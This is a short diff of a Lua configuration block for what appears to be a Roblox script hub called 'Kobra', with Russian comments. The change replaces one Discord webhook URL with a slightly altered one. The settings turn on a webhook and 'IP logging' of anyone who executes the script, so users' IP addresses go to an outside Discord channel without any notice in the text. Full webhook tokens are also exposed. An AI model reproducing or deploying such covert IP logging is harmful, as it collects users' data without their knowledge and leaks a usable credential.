@@ -11,7 +11,7 @@ ApiFTAP:SetSettings({
     NameHub = "Kobra",
     WebhookEnabled = true, -- Enable/Disable
     ExecuteLogSecret = true, -- IP logging
-    WebhookLink = "https://discord.com/api/webhooks/1364446921791508480/QAEuLmPSu1addaZY1gI3ljXlV6fmSZq1gmhHmRN81nIjTIjKfzOJpBCXnOOA5SLaSBC5" -- Исправлена ссылка, если она была неверной
+    WebhookLink = "https://discordapp.com/api/webhooks/1364446921791508480/QAEuLmPSu1addaZY1gI3ljXlV6fmSZq1gmvHmRN81nIjTIjKfzOJpBMXnOOA5SLaSBC5" -- Исправлена ссылка, если она была неверной
 })
 
 -- УДАЛЕНИЕ СТАРОГО МЕНЮ
